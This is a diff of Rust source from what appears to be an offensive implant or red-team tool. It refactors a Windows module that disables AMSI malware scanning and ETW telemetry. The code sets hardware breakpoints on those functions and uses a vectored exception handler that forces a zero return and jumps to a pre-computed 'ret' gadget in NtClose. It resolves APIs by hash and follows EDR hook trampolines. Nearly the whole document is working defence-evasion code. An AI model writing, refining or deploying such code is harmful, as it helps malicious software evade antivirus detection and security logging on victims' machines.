@@ -18,6 +18,12 @@ use std::sync::atomic::{AtomicUsize, Ordering};
 static AMSI_ADDR: AtomicUsize = AtomicUsize::new(0);
 #[cfg(windows)]
 static ETW_ADDR: AtomicUsize = AtomicUsize::new(0);
+/// Pre-computed address of a `ret` (0xC3) gadget found during
+/// `setup_hardware_breakpoints`.  Using a static avoids any memory scan or
+/// `VirtualQuery` call from inside the VEH handler, where those calls risk
+/// deadlock (loader lock / heap lock contention).
+#[cfg(windows)]
+static RET_GADGET: AtomicUsize = AtomicUsize::new(0);
 
 #[cfg(windows)]
 unsafe extern "system" fn veh_handler(
@@ -32,119 +38,22 @@ unsafe extern "system" fn veh_handler(
         let etw = ETW_ADDR.load(Ordering::Relaxed);
 
         if (amsi != 0 && rip == amsi) || (etw != 0 && rip == etw) {
-            // Bypass by clearing RAX (returning 0) and advancing RIP to a ret instruction
+            // Bypass by clearing RAX (returning 0) and advancing RIP to a
+            // pre-computed ret gadget.  The gadget address was resolved and
+            // validated with VirtualQuery during setup_hardware_breakpoints,
+            // before this handler was registered.  Scanning memory or calling
+            // VirtualQuery here would risk deadlock (loader-lock / heap-lock
+            // contention inside a VEH handler).
             (*context).Rax = 0;
-
-            // Use NtClose as a known, small syscall stub to safely find a 'ret' (0xC3)
-            // gadget without hitting false positives in complex instructions.
-            let mut ptr = rip as *const u8; // Fallback to current rip if resolving fails
-            let ntdll: *mut winapi::ctypes::c_void =
-                pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL).unwrap_or(0) as _;
-            if !ntdll.is_null() {
-                let nt_close: *mut winapi::ctypes::c_void =
-                    pe_resolve::get_proc_address_by_hash(ntdll as usize, pe_resolve::HASH_NTCLOSE)
-                        .unwrap_or(0) as _;
-                if !nt_close.is_null() {
-                    let mut p = nt_close as *const u8;
-                    // Follow inline hook trampolines up to a bounded depth.
-                    // Only recognized jmp patterns are followed:
-                    // - 0xFF 0x25: jmp qword ptr [rip+disp32]
-                    // - 0xE9:      jmp rel32
-                    const MAX_HOOK_CHAIN_DEPTH: usize = 3;
-                    let mut depth = 0usize;
-                    loop {
-                        if depth >= MAX_HOOK_CHAIN_DEPTH {
-                            log::trace!(
-                                "evasion: VEH ret-gadget hook chain limit hit (max_depth={}); continuing search path",
-                                MAX_HOOK_CHAIN_DEPTH
-                            );
-                            return winapi::vc::excpt::EXCEPTION_CONTINUE_SEARCH;
-                        }
-
-                        if *p == 0xFF && *p.add(1) == 0x25 {
-                            // RIP-relative indirect jmp: target slot = p+6+disp32.
-                            let disp = std::ptr::read_unaligned(p.add(2) as *const i32);
-                            let slot =
-                                (p as usize).wrapping_add(6).wrapping_add(disp as isize as usize);
-                            let target = std::ptr::read_unaligned(slot as *const usize);
-                            if target == 0 {
-                                break;
-                            }
-                            p = target as *const u8;
-                            depth += 1;
-                            continue;
-                        }
-
-                        if *p == 0xE9 {
-                            // Relative near jmp: target = p+5+disp32.
-                            let disp = std::ptr::read_unaligned(p.add(1) as *const i32);
-                            let target =
-                                (p as usize).wrapping_add(5).wrapping_add(disp as isize as usize);
-                            if target == 0 {
-                                break;
-                            }
-                            p = target as *const u8;
-                            depth += 1;
-                            continue;
-                        }
-
-                        // Not a recognized hook jump at this level; use this address
-                        // as the ret-gadget scan source.
-                        break;
-                    }
-                    ptr = p;
-                }
-            }
-
-            let mut found_ret = false;
-            for _ in 0..64 {
-                // Avoid dereferencing at the very end of a page from inside VEH.
-                // If ptr is the last byte (offset 0xFFF), stop scanning to avoid
-                // crossing into a potentially unmapped page.
-                if (ptr as usize) & 0xFFF > (0x1000 - 2) {
-                    break;
-                }
-                if *ptr == 0xC3 || *ptr == 0xC2 {
-                    found_ret = true;
-                    break;
-                }
-                ptr = ptr.add(1);
-            }
-            // Fallback: if no ret gadget found in the search window, do NOT
-            // redirect RIP to an arbitrary address (which would crash).
-            // Let the exception propagate to the next handler in the VEH chain (C-4).
-            if !found_ret {
+            let gadget = RET_GADGET.load(Ordering::Relaxed);
+            if gadget == 0 {
+                // Gadget was not resolved at setup time; propagate the exception.
                 return winapi::vc::excpt::EXCEPTION_CONTINUE_SEARCH;
             }
-
-            // M-30: Verify the ret gadget doesn't straddle a page boundary.
-            // 0xC3 (ret) is 1 byte — always safe.  0xC2 xx xx (ret N) is 3 bytes —
-            // must check for page boundary crossing.
-            // Note: We use a page-alignment check only (not VirtualQuery) here
-            // because VirtualQuery can deadlock when called from a VEH handler
-            // that was triggered by a memory operation.
-            let gadget_addr = ptr as usize;
-            let gadget_len = if *ptr == 0xC3 { 1usize } else { 3usize }; // 0xC2 = ret N = 3 bytes
-            if gadget_len > 1 {
-                let page_start = gadget_addr & !0xFFF;
-                let page_end = page_start + 0x1000;
-                if gadget_addr + gadget_len > page_end {
-                    // Gadget straddles a page boundary — unsafe to execute.
-                    return winapi::vc::excpt::EXCEPTION_CONTINUE_SEARCH;
-                }
-            }
-
-            // Stack corruption mitigation: redirect RIP to the ret gadget.
-            // For a bare `ret` (0xC3) the CPU will pop [Rsp] into Rip and
-            // add 8, which is safe provided the HWBP fires at the function
-            // entry before any prologue has shifted Rsp.  For `ret N` (0xC2)
-            // the CPU additionally adds N to Rsp after the pop, cleaning up
-            // the stack arguments — this is generally the safer variant.
-            // In both cases we set Rip to the gadget and let the CPU handle
-            // the stack adjustment; we do NOT manually touch Rsp here to
-            // avoid double-adjusting it.
-            (*context).Rip = ptr as u64;
-
+            // Redirect RIP to the ret gadget.  The CPU will pop [Rsp] into Rip
+            // and advance Rsp by 8 (or 8+N for ret N), cleanly returning from
+            // the intercepted AMSI/ETW function to its caller.
+            (*context).Rip = gadget as u64;
             return winapi::vc::excpt::EXCEPTION_CONTINUE_EXECUTION;
         }
     }
@@ -211,6 +120,104 @@ pub unsafe fn setup_hardware_breakpoints() {
         if !nt_set_addr.is_null() {
             nt_set_context_thread = Some(std::mem::transmute(nt_set_addr));
         }
+
+        // Pre-compute a `ret` gadget from NtClose so that veh_handler never
+        // needs to scan memory or call VirtualQuery at exception time.
+        // VirtualQuery is safe here (not inside a VEH handler).
+        'gadget: {
+            use winapi::um::memoryapi::VirtualQuery;
+            use winapi::um::winnt::{MEMORY_BASIC_INFORMATION, MEM_COMMIT, PAGE_EXECUTE_READ};
+
+            let nt_close_raw =
+                pe_resolve::get_proc_address_by_hash(ntdll as usize, pe_resolve::HASH_NTCLOSE)
+                    .unwrap_or(0);
+            if nt_close_raw == 0 {
+                break 'gadget;
+            }
+
+            // Follow inline hook trampolines (same bounded-depth logic that
+            // was previously inside veh_handler) to reach the real stub.
+            let mut p = nt_close_raw as *const u8;
+            const MAX_DEPTH: usize = 3;
+            for _ in 0..MAX_DEPTH {
+                // Verify the current byte is readable before peeking at the opcode.
+                let mut mbi: MEMORY_BASIC_INFORMATION = std::mem::zeroed();
+                if VirtualQuery(
+                    p as *const _,
+                    &mut mbi,
+                    std::mem::size_of::<MEMORY_BASIC_INFORMATION>(),
+                ) == 0
+                    || mbi.State != MEM_COMMIT
+                {
+                    break 'gadget;
+                }
+
+                if *p == 0xFF && *p.add(1) == 0x25 {
+                    let disp = std::ptr::read_unaligned(p.add(2) as *const i32);
+                    let slot = (p as usize).wrapping_add(6).wrapping_add(disp as isize as usize);
+                    let target = std::ptr::read_unaligned(slot as *const usize);
+                    if target == 0 {
+                        break 'gadget;
+                    }
+                    p = target as *const u8;
+                } else if *p == 0xE9 {
+                    let disp = std::ptr::read_unaligned(p.add(1) as *const i32);
+                    let target =
+                        (p as usize).wrapping_add(5).wrapping_add(disp as isize as usize);
+                    if target == 0 {
+                        break 'gadget;
+                    }
+                    p = target as *const u8;
+                } else {
+                    break; // not a trampoline; scan from here
+                }
+            }
+
+            // Scan up to 64 bytes for 0xC3 (ret), verifying each page with
+            // VirtualQuery before the first dereference on that page.
+            let mut last_page: usize = usize::MAX;
+            for _ in 0..64usize {
+                let addr = p as usize;
+                let page = addr & !0xFFF_usize;
+                if page != last_page {
+                    // New page: verify it is committed and readable/executable.
+                    let mut mbi: MEMORY_BASIC_INFORMATION = std::mem::zeroed();
+                    if VirtualQuery(
+                        p as *const _,
+                        &mut mbi,
+                        std::mem::size_of::<MEMORY_BASIC_INFORMATION>(),
+                    ) == 0
+                        || mbi.State != MEM_COMMIT
+                    {
+                        break 'gadget;
+                    }
+                    // Require at least PAGE_EXECUTE_READ.
+                    let prot = mbi.Protect & 0xFF; // mask off guard/nocache modifiers
+                    if prot < PAGE_EXECUTE_READ {
+                        break 'gadget;
+                    }
+                    last_page = page;
+                }
+
+                if *p == 0xC3 {
+                    // `ret` is 1 byte — always within its page.
+                    RET_GADGET.store(addr, Ordering::Relaxed);
+                    log::debug!("evasion: ret gadget pre-computed at {:#x}", addr);
+                    break 'gadget;
+                }
+
+                // Skip 0xC2 (ret N, 3 bytes) if it would straddle a page boundary.
+                if *p == 0xC2 {
+                    if addr + 3 <= (page + 0x1000) {
+                        RET_GADGET.store(addr, Ordering::Relaxed);
+                        log::debug!("evasion: ret-N gadget pre-computed at {:#x}", addr);
+                    }
+                    break 'gadget;
+                }
+
+                p = p.add(1);
+            }
+        } // end 'gadget
     }
 
     if nt_set_context_thread.is_some() {
